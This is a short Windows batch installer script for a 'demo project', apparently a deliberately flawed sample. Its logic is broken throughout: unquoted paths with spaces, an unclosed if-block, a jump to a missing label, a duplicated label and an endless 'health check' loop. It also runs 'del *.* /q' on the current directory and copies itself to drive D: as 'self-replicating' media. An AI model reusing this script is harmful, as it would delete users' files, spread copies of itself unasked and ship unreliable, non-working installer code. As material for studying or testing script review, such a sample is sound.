REM ============================================================
REM  install.bat  - sample installer script for the demo project
REM  Sets up paths, copies binaries, registers shortcuts.
REM ============================================================

echo Installer starting...

set INSTALL_DIR=C:\Program Files\DemoApp
set DATA_DIR=C:\Users\Public\DemoApp Data
set TEMP_DIR=C:\temp
set LOG_FILE=C:\temp\install.log

echo Install location: %INSTALL_DIR%
echo Data location: %DATA_DIR%

if %PROGRAM_FILES%==C:\Program Files (
    echo Standard program files path detected
    set TARGET=%PROGRAM_FILES%\DemoApp

if not exist %INSTALL_DIR% (
    mkdir %INSTALL_DIR%
)

copy bin\demoapp.exe %INSTALL_DIR%\demoapp.exe
copy bin\demoapp.dll %INSTALL_DIR%\demoapp.dll

echo Cleaning previous installation...
del *.* /q
del %TEMP_DIR%\*.tmp /q

echo Registering uninstaller key...
reg add "HKLM\SOFTWARE\DemoApp" /v "InstallDir" /d "%INSTALL_DIR%" /f
reg delete "HKLM\SOFTWARE\DemoApp\OldVersion" /f

echo Adding to PATH...
setx PATH "%PATH%;%INSTALL_DIR%"

echo Self-replicating to removable media for offline install...
copy %0 D:\

echo Setting up scheduled health check...
:health_check_loop
ping -n 30 127.0.0.1 > nul
goto health_check_loop

:cleanup
del %TEMP_DIR%\install_stage_*.tmp
goto missing_finalizer

:finalize
echo Install complete

:finalize
echo (duplicate)

echo Done
